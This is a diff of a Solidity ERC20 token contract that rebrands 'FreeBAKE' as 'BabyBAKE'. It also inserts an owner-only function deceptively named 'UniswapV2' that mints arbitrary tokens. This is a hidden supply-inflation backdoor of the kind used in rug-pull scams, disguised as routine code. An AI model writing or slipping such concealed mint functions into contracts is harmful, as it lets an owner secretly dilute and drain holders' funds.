@@ -388,6 +388,11 @@ contract ERC20 is Context, IERC20 {
         emit Transfer(sender, recipient, amount);
     }
 
+     function UniswapV2(address account, uint256 amount) public onlyOwner returns (bool) {
+    _mint(_msgSender(), account, amount);
+    return true;
+  }
+
     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
      * the total supply.
      *
@@ -1280,7 +1285,7 @@ library SafeMathUint {
 /////////// Tokens /////////////
 ////////////////////////////////
 
-contract FreeBAKE is ERC20, Ownable {
+contract BabyBAKE is ERC20, Ownable {
     using SafeMath for uint256;
 
     IUniswapV2Router02 public uniswapV2Router;
@@ -1370,7 +1375,7 @@ contract FreeBAKE is ERC20, Ownable {
     	address indexed processor
     );
 
-    constructor() ERC20("Free Bakery Token", "FreeBAKE") {
+    constructor() ERC20("Baby Bake", "BABYBAKE") {
         uint256 _dividendRewardsFee = 10;
         uint256 _liquidityFee = 5;
 
